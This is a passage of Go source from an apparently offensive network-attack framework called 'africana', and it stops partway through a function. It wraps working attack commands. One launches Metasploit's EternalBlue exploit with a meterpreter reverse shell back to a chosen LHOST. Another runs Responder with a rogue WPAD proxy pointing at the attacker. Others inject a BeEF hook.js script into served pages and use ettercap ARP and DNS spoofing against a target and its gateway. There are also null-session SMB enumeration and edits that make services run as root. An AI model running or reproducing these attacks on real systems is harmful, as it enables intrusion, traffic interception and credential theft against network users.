package internals

import(
    "os"
    "fmt"
    "utils"
    "menus"
    "bufio"
    "strings"
    "os/exec"
    "bcolors"
    "subprocess"
)

var(
    userInput   string
    userTarget  string
    userLhost   string
    userLPort   string
    userFakeDns string
    userName    string
    userPass    string
    userIface   string
    scanner = bufio.NewScanner(os.Stdin)
)

func InternalScan() {
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface to use " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    scanner.Scan()
    userIface := scanner.Text()
    if userIface == "" {
        userIface = "eth0"
    }
    switch strings.ToLower(userIface) {
    case "e", "q", "exit", "quit":
        os.Exit(0)
    default:
        subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; active; ticker on"`, userIface)
        return
   }
}

func NmapPortScan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "Port scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
    //subprocess.Popen(`masscan -v %s --ports 0-65535 --rate 10000 --wait 0`, userTarget)
        fmt.Println()
    subprocess.Popen(`nmap --open -T4 -Pn -n -v -p- %s`, userTarget)
    return
}

func NmapVulnScan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "Vuln scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nmap --open -v -T4 -Pn -n -sSV -p- --script="vuln and safe" --reason %s`, userTarget)
    return
}

func SmbVulnScan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "SMB vuln scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nmap -Pn -v --script "smb-vuln*" -p139,445 %s`, userTarget)
    return
}

func Enum4linux(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "SMB recon scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, userTarget)
    return
}

func EnumNxc(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "SMB recon scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol`, userTarget)
    return
}

func SmbMapScan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "SMB recon scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`smbmap --no-banner -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, userTarget, userTarget)
    return
}

func RpcEnumScan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "RPC recon scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`rpcclient -U "" -N %s`, userTarget)
    return
}

func SmbExploit(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        return
    }
    menus.MenuThreeOne()
    for {
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit" + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        fmt.Scan(&userInput)
        switch userInput {
        case "0":
            return
        case "1":
            fmt.Println()
            subprocess.Popen(`ip address`)
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userLhost := scanner.Text()
            if userLhost == "" {
                userLhost = userLhostIp
            }
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userLport := scanner.Text()
            if userLport == "" {
                userLport = "9999"
            }
            subprocess.Popen(`msfdb start; msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, userTarget, userLhost, userLport)
        case "cls", "clear":
            utils.ClearScreen()
        case "99", "m", "M", "menu", "Menu", "MENU":
            menus.MenuThreeOne()
        case "00", "h", "H", "help", "Help", "HELP":
            menus.HelpThree()
        default:
            utils.SystemShell(userInput)
        }
    }
}

func PacketSniffer(userTarget string) {
    menus.MenuThreeTwo()
    for {
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Sniffer" + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐽" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        fmt.Scan(&userInput)
        switch userInput {
        case "0":
            return
        case "1":
            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, userTarget)
        case "2":
            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`)
        case "99", "m", "M", "menu", "Menu", "MENU":
            menus.MenuThreeTwo()
        case "00", "h", "H", "help", "Help", "HELP":
            menus.HelpThree()
        default:
            utils.SystemShell(userInput)
        }
    }
}

func PacketsResponder() {
    filePath := "/etc/responder/Responder.conf.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Println("Error getting default userLhostIp:", err)
            os.Exit(1)
        }
        subprocess.Popen(`cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana`)
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userIface := scanner.Text()
        if userIface == "" {
            userIface = "eth0"
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Responder " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, userLhost, userLhost)
        filesToReplacements := map[string]map[string]string{
            "/etc/responder/Responder.conf": {
            `WPADScript =`: newString,
            },
        }
        utils.Editors(filesToReplacements)
        subprocess.Popen(`responder -I %s -Pdv`, userIface)
        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
    } else {
        subprocess.Popen(`responder -I %s -Pdv`, userIface)
        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
    }
}

func BeefEttercap(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    menus.MenuThreeFour()
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userInput := scanner.Text()
    switch strings.ToLower(userInput) {
    case "0":
        return
    case "1":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }
            fmt.Println()
            subprocess.Popen(`ip address`)
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userIface := scanner.Text()
            if userIface == "" {
                userIface = "eth0"
            }
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userLhost := scanner.Text()
            if userLhost == "" {
                userLhost = userLhostIp
            }
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userFakeDns := scanner.Text()
            if userFakeDns == "" {
                userFakeDns = "*"
            }
            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }
            fileXPath := "/var/www/html/.userFiles"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            userGateway, err := utils.GetDefaultGatewayIP()
            if err != nil {
                panic(err)
            }
            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service; sleep 5`)
            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, userLhostIp, userIface, userTarget, userGateway)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dn`)
            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service`)
    case "2":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }
            fmt.Println()
            subprocess.Popen(`ip address`)
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userIface := scanner.Text()
            if userIface == "" {
                userIface = "eth0"
            }
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userLhost := scanner.Text()
            if userLhost == "" {
                userLhost = userLhostIp
            }
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userFakeDns := scanner.Text()
            if userFakeDns == "" {
                userFakeDns = "*"
            }
            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }
            fileXPath := "/var/www/html/.userFiles"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service; sleep 5`)
            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof ///`, userLhostIp, userIface)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service`)
    default:
        utils.SystemShell(userInput)
    }
}

func BeefBettercap(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    menus.MenuThreeFour()
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userInput := scanner.Text()
    switch strings.ToLower(userInput) {
    case "0":
        return
    case "1":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }
            fmt.Println()
            subprocess.Popen(`ip address`)
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userIface := scanner.Text()
            if userIface == "" {
                userIface = "eth0"
            }
